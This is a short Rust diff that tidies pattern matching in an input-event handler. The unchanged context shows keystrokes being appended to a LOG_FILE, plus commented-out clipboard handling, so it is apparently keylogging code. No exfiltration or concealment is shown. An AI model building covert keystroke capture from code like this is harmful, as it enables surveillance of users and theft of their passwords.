@@ -210,9 +210,7 @@ fn track(event: Event) {
                         // clipboard.set_text(the_string).unwrap();
                         // println!("But now the clipboard text should be: \"{}\"", the_string);
                     },
-                    _ => {
-
-                    }
+                    _ => {}
                 }
             } else {
                 *LOG_FILE.lock().unwrap() += &_key;
@@ -257,9 +255,9 @@ fn track(event: Event) {
                     }
                 }
             },
-            Button::Unknown(code) => (),
+            Button::Unknown(..) => (),
         },
-        EventType::MouseMove{x, y} => (),
+        EventType::MouseMove{..} => (),
         _ => (),
     }
 }
